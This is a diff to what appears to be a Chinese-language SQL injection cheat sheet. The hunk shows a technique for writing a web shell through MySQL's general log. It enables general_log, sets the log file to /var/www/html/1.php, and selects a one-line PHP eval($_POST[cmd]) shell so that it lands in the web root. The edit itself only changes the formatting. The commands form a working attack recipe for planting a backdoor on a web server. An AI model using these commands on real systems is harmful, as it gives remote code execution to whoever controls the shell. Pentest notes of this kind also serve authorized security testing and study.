@@ -242,15 +242,16 @@ http://www.cnblogs.com/lcamry/p/5729087.html
 <br />
 <a href="http://blog.cora-lab.org/287.html">利用日志写shell</a>:适用于outfile被过滤，或者禁止写入文件，但要root权限
 客户端下:
-```
+```php
 show variables like '%general%';  查看配置
 
 set global general_log = on;  开启general log模式
 
 set global general_log_file = '/var/www/html/1.php';   设置日志目录为shell地址
 
-select '<?php eval($_POST[cmd]);?>'  写入shell
+select \'<?php eval($_POST[cmd]);?>\'  写入shell
 ```   
+
 
 # 宽字节注入
 [宽字节注入笔记][4]
